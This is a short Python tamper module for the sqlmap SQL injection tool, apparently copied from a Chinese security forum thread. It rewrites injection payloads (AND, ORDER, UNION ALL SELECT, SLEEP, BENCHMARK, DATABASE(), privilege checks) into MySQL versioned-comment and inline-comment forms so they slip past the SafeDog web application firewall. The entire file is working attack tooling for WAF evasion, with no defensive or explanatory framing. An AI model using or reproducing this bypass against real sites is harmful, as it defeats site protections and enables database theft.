# coding=UTF-8 
# Desc: sqlmap_bypass_安全狗2_tamper
# from: https://www.t00ls.net/thread-58882-1-1.html

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*!29440AND*/')
    payload=payload.replace('ORDER','/*!29440order*/')
    payload=payload.replace('LIKE USER()','like (user/**/())')
    payload=payload.replace('DATABASE()','database/*!29440*/()')
    payload=payload.replace('CURRENT_USER()','CURRENT_USER/**/()')
    payload=payload.replace('SESSION_USER()','SESSION_USER(%0a)')
    payload=payload.replace('UNION ALL SELECT','union/*!29440select*/')
    payload=payload.replace('super_priv','/*!29440/**/super_priv*/')
    payload=payload.replace('and host=','/*!29440and*/host/*!11440=*/')
    payload=payload.replace('BENCHMARK(','BENCHMARK/*!29440*/(')
    payload=payload.replace('SLEEP(','sleep/**/(')
    return payload